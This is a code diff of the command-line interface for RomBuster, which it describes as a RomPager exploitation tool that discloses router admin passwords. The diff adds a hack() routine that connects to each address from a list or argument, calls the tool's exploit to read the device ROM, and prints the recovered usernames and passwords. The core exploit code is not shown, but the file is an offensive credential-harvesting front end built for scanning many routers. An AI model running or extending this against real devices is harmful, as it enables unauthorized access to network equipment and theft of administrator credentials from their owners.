@@ -26,19 +26,45 @@
 
 import argparse
 
-from core.exploit import Exploit
+from .__main__ import RomBuster
+from .badges import Badges
 
 
-class CLI(Exploit):
+class RomBusterCLI(RomBuster, Badges):
     description = "RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password."
     parser = argparse.ArgumentParser(description=description)
-    parser.add_argument('--ip-list', dest='list', help='IP addresses list.')
+    parser.add_argument('--list', dest='list', help='Addresses list.')
+    parser.add_argument('--address', dest='address', help='Address.')
     args = parser.parse_args()
 
+    def hack(self, host):
+        self.print_process(f"({host}) - connecting to device ...")
+        response = self.connect(host)
+
+        if response is not None:
+            self.print_process(f"({host}) - accessing device rom ...")
+            creds = self.exploit(response)
+
+            if creds is not None:
+                self.print_process(f"({host}) - extracting credentials ...")
+                for username in creds.keys():
+                    self.print_information(f"({host}) - {username}:{creds[username]}")
+            else:
+                self.print_error(f"({host}) - rom access denied!")
+        else:
+            self.print_error(f"({host}) - connection rejected!")
+
     def start(self):
-        with open(self.args.list, 'r') as f:
-            lines = f.read().strip().split('\n')
-            for line in lines:
-                self.exploit(line)
-        for credential in self.credentials:
-            print(credential)
+        if self.args.list:
+            with open(self.args.list, 'r') as f:
+                lines = f.read().strip().split('\n')
+                for line in lines:
+                    self.hack(line)
+        elif self.args.address:
+            self.hack(self.args.address)
+        else:
+            self.print_error("No list or address specified!")
+
+def main():
+    cli = RomBusterCLI()
+    cli.start()
